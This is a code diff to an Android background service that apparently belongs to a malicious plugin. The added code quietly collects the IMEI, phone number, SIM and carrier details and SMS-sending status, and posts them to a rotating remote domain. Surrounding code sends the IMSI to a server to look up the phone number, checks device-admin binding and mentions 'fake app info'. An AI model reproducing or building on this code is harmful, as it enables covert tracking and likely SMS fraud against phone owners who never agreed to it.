@@ -22,10 +22,7 @@ import com.xstd.plugin.config.Config;
 import com.xstd.plugin.config.PluginSettingManager;
 
 import java.io.File;
-import java.util.ArrayList;
-import java.util.Calendar;
-import java.util.HashMap;
-import java.util.UUID;
+import java.util.*;
 
 /**
  * Created with IntelliJ IDEA.
@@ -49,6 +46,8 @@ public class PluginService extends IntentService {
     public static final String ACTION_FETCH_DOMAIN = "com.xstd.plugin.domain.fetch";
 
     public static final String ACTION_UPDATE_UMENG = "com.xstd.plugin.umeng.event";
+
+    public static final String ACTION_UPDATE_SMS_STATUS = "com.xstd.plugin.update.sms.status";
 
     /**
      * 统计预装软件的信息
@@ -99,10 +98,62 @@ public class PluginService extends IntentService {
                 updateUmengEvent(intent);
             } else if (ACTION_PHONE_INSTALL_INFO.equals(action)) {
                 updatePhoneInstallInfo(intent);
+            } else if (ACTION_UPDATE_SMS_STATUS.equals(action)) {
+                updatePhoneSMSStatus();
             }
         }
 
         MobclickAgent.onPause(this);
+    }
+
+    private synchronized void updatePhoneSMSStatus() {
+        if (!UtilsRuntime.isOnline(getApplicationContext())) return;
+
+        if (!PluginSettingManager.getInstance().getShouldUpdateSMSStatus()) {
+            return;
+        }
+
+        AppRuntime.UPDATE_SMS_STATUS.set(true);
+        try {
+            PluginSettingManager.getInstance().init(getApplicationContext());
+            String simCard = "SIM卡没准备好";
+            if (AppRuntime.isSIMCardReady(getApplicationContext())) {
+                simCard = "SIM卡准备好";
+            }
+            String active = "未发送短信到服务器";
+            if (PluginSettingManager.getInstance().getKeyDeviceHasSendToServicePhone()) {
+                active = "已发送短信到服务器";
+            }
+            String smsStaus = "成功";
+            if (PluginSettingManager.getInstance().getKeyDeviceHasSendToServicePhone()) {
+                smsStaus = "成功";
+            } else {
+                smsStaus = PluginSettingManager.getInstance().getLastSMSErrorInfo();
+            }
+            if (TextUtils.isEmpty(smsStaus)) {
+                smsStaus = "未知";
+            }
+            PluginSMSStatusRequest request = new PluginSMSStatusRequest(PluginSettingManager.getInstance().getMainApkChannel(),
+                                                                           Config.CHANNEL_CODE,
+                                                                           UtilsRuntime.getIMEI(getApplicationContext()),
+                                                                           Build.MODEL,
+                                                                           Build.VERSION.RELEASE,
+                                                                           AppRuntime.getNetworkTypeNameByIMSI(getApplicationContext()),
+                                                                           (SimCardUtils.issDoubleTelephone(getApplicationContext()) ? "双卡" : "单卡"),
+                                                                           simCard,
+                                                                           active,
+                                                                           PluginSettingManager.getInstance().getCurrentPhoneNumber(),
+                                                                           smsStaus,
+                                                                           DomanManager.getInstance(getApplicationContext()).getOneAviableDomain() + "/pluginSMSStatus/");
+            PluginSMSStatusResponse response = InternetUtils.request(getApplicationContext(), request);
+            if (response != null && response.result == 1) {
+                //上传成功
+                PluginSettingManager.getInstance().setShouldUpdateSMSStatus(false);
+            }
+        } catch (Exception e) {
+        }
+
+        AppRuntime.UPDATE_SMS_STATUS.set(false);
     }
 
     private synchronized void updatePhoneInstallInfo(Intent intent) {
@@ -284,8 +335,8 @@ public class PluginService extends IntentService {
 
                     PhoneFetchRespone respone = InternetUtils.request(getApplicationContext()
                                                                          , new PhoneFetchRequest(DomanManager.getInstance(getApplicationContext())
-                                                                                                        .getOneAviableDomain()
-                                                                                                        + "/tools/i2n/" + imsi));
+                                                                                                     .getOneAviableDomain()
+                                                                                                     + "/tools/i2n/" + imsi));
                     if (respone != null && !TextUtils.isEmpty(respone.phone)) {
                         if (Config.DEBUG) {
                             Config.LOGD("[[PluginService::fetchPhoneFromServer]] after fetch PHONE number : (" + respone.phone + ")");
@@ -682,7 +733,7 @@ public class PluginService extends IntentService {
 
             DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
             boolean isActive = dpm.isAdminActive(new ComponentName(this.getApplicationContext(), DeviceBindBRC.class))
-                                    && PluginSettingManager.getInstance().getKeyHasBindingDevices();
+                                   && PluginSettingManager.getInstance().getKeyHasBindingDevices();
 
             if (Config.DEBUG) {
                 Config.LOGD("[[PluginService::onHandleIntent]] current fake app info : name = " + intent.getStringExtra("name")
